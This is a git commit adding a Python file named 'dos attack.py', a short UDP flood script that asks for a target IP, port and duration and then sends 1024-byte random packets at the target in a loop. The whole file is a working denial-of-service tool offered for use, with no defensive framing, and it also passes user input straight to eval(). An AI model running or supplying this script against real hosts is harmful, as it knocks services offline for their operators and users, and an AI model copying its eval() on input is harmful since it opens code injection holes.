65d73b47e01f4ec9400b879c24a0e4387e71e227
beky02 <37780908+beky02@users.noreply.github.com>
2018-04-03 08:30:18 -0700

    Add files via upload

---
+++ dos attack.py
@@ -0,0 +1,32 @@
+import os
+import sys
+import time
+import socket
+import random
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1024)
+
+os.system("clear")
+print("    welcome to dos attack    ")
+print("=============================")
+
+ip = input("Enter Target Ip: ")
+
+port = eval(input("Enter Port: "))
+dur = eval(input("Enter How Many Times To Send: "))
+timeout = time.time() + dur
+sent = 0
+
+while True:
+    try:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        sock.sendto(bytes,(ip, port))
+        sent = sent + 1
+        print("Sent %s packets to %s through port %s"%(sent, ip, port))
+
+    except KeyboardInterrupt:
+        sys.exit()
